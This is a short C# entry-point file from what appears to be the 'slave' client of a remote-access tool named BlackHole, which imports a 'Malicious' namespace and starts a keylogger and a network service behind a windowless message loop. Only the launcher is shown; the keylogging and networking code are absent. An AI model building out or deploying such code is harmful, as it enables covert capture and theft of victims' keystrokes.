using BlackHole.Slave.Malicious;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BlackHole.Slave
{
    class Program
    {
        static void Main(string[] args)
        {
            Keylogger.Instance.Initialize();
            NetworkService.Instance.Initialize();
            Application.Run();
        }
    }
}
